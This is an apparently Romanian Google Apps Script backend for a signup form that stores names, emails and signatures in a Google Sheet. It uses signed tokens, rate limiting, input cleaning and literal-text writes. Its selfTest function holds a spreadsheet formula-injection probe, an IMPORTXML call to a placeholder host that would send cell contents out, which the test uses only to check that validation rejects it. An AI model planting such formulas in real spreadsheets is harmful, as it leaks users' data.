/* ======================================================================
   1. LIMITS AND KEYS
   ====================================================================== */

var LIMITS = {
  bodyChars: 4096,
  nameMin: 2,
  nameMax: 80,
  emailMax: 254,
  tokenMinAgeMs: 1200,
  tokenMaxAgeMs: 30 * 60 * 1000
};

function getSigningKey_() {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty('SIGNING_KEY');
  if (!key) {
    key = Utilities.base64Encode(
      Utilities.getUuid() + '.' + Utilities.getUuid() + '.' + Date.now()
    );
    props.setProperty('SIGNING_KEY', key);
  }
  return key;
}

function hmac_(message) {
  var raw = Utilities.computeHmacSha256Signature(message, getSigningKey_());
  return Utilities.base64EncodeWebSafe(raw).replace(/=+$/, '');
}

function safeEquals_(a, b) {
  var x = String(a), y = String(b);
  if (x.length !== y.length) return false;
  var diff = 0;
  for (var i = 0; i < x.length; i++) {
    diff |= x.charCodeAt(i) ^ y.charCodeAt(i);
  }
  return diff === 0;
}


/* ======================================================================
   2. TOKENS AND RATE LIMIT
   ====================================================================== */

function issueToken() {
  var payload = Date.now() + '.' + Utilities.getUuid();
  return payload + '.' + hmac_(payload);
}

function consumeToken_(token) {
  if (typeof token !== 'string' || token.length > 200) return false;

  var parts = token.split('.');
  if (parts.length !== 3) return false;

  var issuedAt = parts[0], nonce = parts[1], mac = parts[2];
  if (!/^\d{13}$/.test(issuedAt) || !/^[0-9a-fA-F-]{36}$/.test(nonce)) {
    return false;
  }
  if (!safeEquals_(mac, hmac_(issuedAt + '.' + nonce))) return false;

  var age = Date.now() - Number(issuedAt);
  if (age < LIMITS.tokenMinAgeMs || age > LIMITS.tokenMaxAgeMs) return false;

  var cache = CacheService.getScriptCache();
  var key = 'tok:' + nonce;
  if (cache.get(key)) return false;
  cache.put(key, '1', Math.ceil(LIMITS.tokenMaxAgeMs / 1000) + 60);
  return true;
}

var RATE_MAX = 300;
var RATE_WINDOW_MS = 60 * 60 * 1000;

function rateLimitOk_() {
  var cache = CacheService.getScriptCache();
  var now = Date.now();
  var cutoff = now - RATE_WINDOW_MS;
  var recent = [];

  (cache.get('rate') || '').split(',').forEach(function (value) {
    var timestamp = Number(value);
    if (timestamp >= cutoff) recent.push(timestamp);
  });

  if (recent.length >= RATE_MAX) return false;
  recent.push(now);
  cache.put('rate', recent.join(','), Math.ceil(RATE_WINDOW_MS / 1000) + 60);
  return true;
}


/* ======================================================================
   3. INPUT VALIDATION
   ====================================================================== */

function clean_(value) {
  if (typeof value !== 'string') return '';
  var source = value.normalize('NFC');
  var cleaned = '';

  for (var i = 0; i < source.length; i++) {
    var code = source.charCodeAt(i);
    if (code < 32 || (code >= 127 && code <= 159)) {
      cleaned += ' ';
      continue;
    }
    if ((code >= 8203 && code <= 8207) ||
        (code >= 8234 && code <= 8238) ||
        (code >= 8294 && code <= 8297) || code === 65279) {
      continue;
    }
    cleaned += source.charAt(i);
  }

  return cleaned.replace(/\s+/g, ' ').trim();
}

var NAME_RE = /^[\p{L}\p{M}][\p{L}\p{M} '’.\-]*$/u;
var EMAIL_RE = /^[A-Za-z0-9!#$%&'*+/=?^_`{|}~.\-]{1,64}@[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*\.[A-Za-z]{2,63}$/;

function validateName_(raw) {
  var value = clean_(raw);
  if (value.length < LIMITS.nameMin || value.length > LIMITS.nameMax) return null;
  if (!NAME_RE.test(value)) return null;
  return value;
}

function validateEmail_(raw) {
  var value = clean_(raw).toLowerCase().replace(/\s/g, '');
  if (value.length < 6 || value.length > LIMITS.emailMax) return null;
  if (!EMAIL_RE.test(value)) return null;
  if (value.indexOf('..') !== -1) return null;
  if (value.charAt(0) === '.' || value.indexOf('.@') !== -1) return null;
  return value;
}

function validateSubmission_(body) {
  if (!body || typeof body !== 'object' || Array.isArray(body)) {
    return { ok: false, error: 'invalid' };
  }

  if (clean_(body.company) !== '') {
    return { ok: false, error: 'honeypot' };
  }

  var fullName = validateName_(body.fullName);
  var email = validateEmail_(body.email);
  var signature = validateName_(body.signature);

  if (!fullName) return { ok: false, error: 'invalid_name' };
  if (!email) return { ok: false, error: 'invalid_email' };
  if (!signature) return { ok: false, error: 'invalid_signature' };
  if (signature !== fullName) return { ok: false, error: 'invalid_signature' };

  return {
    ok: true,
    record: {
      receivedAt: Utilities.formatDate(
        new Date(),
        'Europe/Bucharest',
        'dd.MM.yyyy HH:mm'
      ),
      fullName: fullName,
      email: email,
      signature: signature
    }
  };
}


/* ======================================================================
   4. GOOGLE SHEET
   ====================================================================== */

var SHEET_NAME = 'prime_2026_B';
var COLUMNS = ['Data', 'Nume complet', 'Email', 'Signature'];

function getInboxSheet_() {
  var spreadsheet = SpreadsheetApp.getActive();
  return spreadsheet.getSheetByName(SHEET_NAME) ||
    spreadsheet.insertSheet(SHEET_NAME, 0);
}

function ensureHeader_(sheet) {
  if (sheet.getLastRow() > 0) return;

  sheet.getRange(1, 1, 1, COLUMNS.length)
    .setValues([COLUMNS])
    .setFontWeight('bold');
  sheet.setFrozenRows(1);
  sheet.setColumnWidth(1, 170);
  sheet.setColumnWidth(2, 220);
  sheet.setColumnWidth(3, 240);
  sheet.setColumnWidth(4, 220);
}

function emailExists_(sheet, email) {
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return false;

  var values = sheet.getRange(2, 3, lastRow - 1, 1).getValues();
  for (var i = 0; i < values.length; i++) {
    var cell = String(values[i][0]).replace(/^'/, '').trim().toLowerCase();
    if (cell === email) return true;
  }
  return false;
}

function asLiteralText_(value) {
  return "'" + String(value == null ? '' : value);
}

function writeRow(record) {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(20000)) throw new Error('busy');

  try {
    var sheet = getInboxSheet_();
    ensureHeader_(sheet);

    if (emailExists_(sheet, record.email)) return false;

    var row = [
      asLiteralText_(record.receivedAt),
      asLiteralText_(record.fullName),
      asLiteralText_(record.email),
      asLiteralText_(record.signature)
    ];

    sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length).setValues([row]);
    SpreadsheetApp.flush();
    return true;
  } finally {
    lock.releaseLock();
  }
}


/* ======================================================================
   5. WEB APP ROUTES
   ====================================================================== */

function respond_(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet(e) {
  var action = e && e.parameter ? e.parameter.action : '';
  if (action === 'token') {
    return respond_({ ok: true, token: issueToken() });
  }
  return respond_({ ok: false, error: 'not_found' });
}

function doPost(e) {
  try {
    if (!e || !e.postData || typeof e.postData.contents !== 'string') {
      return respond_({ ok: false, error: 'invalid' });
    }
    if (e.postData.contents.length > LIMITS.bodyChars) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var body;
    try {
      body = JSON.parse(e.postData.contents);
    } catch (parseError) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var checked = validateSubmission_(body);
    if (!checked.ok && checked.error === 'honeypot') {
      return respond_({ ok: true });
    }
    if (!checked.ok) {
      return respond_({ ok: false, error: checked.error });
    }
    if (!consumeToken_(body.token)) {
      return respond_({ ok: false, error: 'token' });
    }
    if (!rateLimitOk_()) {
      return respond_({ ok: false, error: 'busy' });
    }
    if (!writeRow(checked.record)) {
      return respond_({ ok: false, error: 'duplicate' });
    }

    return respond_({ ok: true });
  } catch (error) {
    if (error && error.message === 'busy') {
      return respond_({ ok: false, error: 'busy' });
    }
    console.error(
      'doPost failed: ' + (error && error.stack ? error.stack : error)
    );
    return respond_({ ok: false, error: 'server' });
  }
}


/* ======================================================================
   6. EDITOR TOOLS
   ====================================================================== */

function setup() {
  var sheet = getInboxSheet_();
  getSigningKey_();
  ensureHeader_(sheet);
  console.log('Ready. Writing to the "' + sheet.getName() + '" tab.');
}

function selfTest() {
  var probes = [
    '=IMPORTXML("https://example.invalid/?x="&A2,"//a")',
    '+1+1',
    '@SUM(A1:A9)',
    '-1-1'
  ];

  probes.forEach(function (probe) {
    var checked = validateSubmission_({
      fullName: probe,
      email: 'probe@example.com',
      signature: probe
    });
    if (checked.ok) {
      throw new Error('validation let a formula through: ' + probe);
    }
  });

  var written = writeRow({
    receivedAt: Utilities.formatDate(
      new Date(),
      'Europe/Bucharest',
      'dd.MM.yyyy HH:mm'
    ),
    fullName: 'Test Ionescu',
    email: 'test+' + Date.now() + '@example.com',
    signature: 'Test Ionescu'
  });

  console.log(written
    ? 'selfTest passed — delete the test row from the sheet.'
    : 'selfTest wrote nothing because the email already exists.');
}
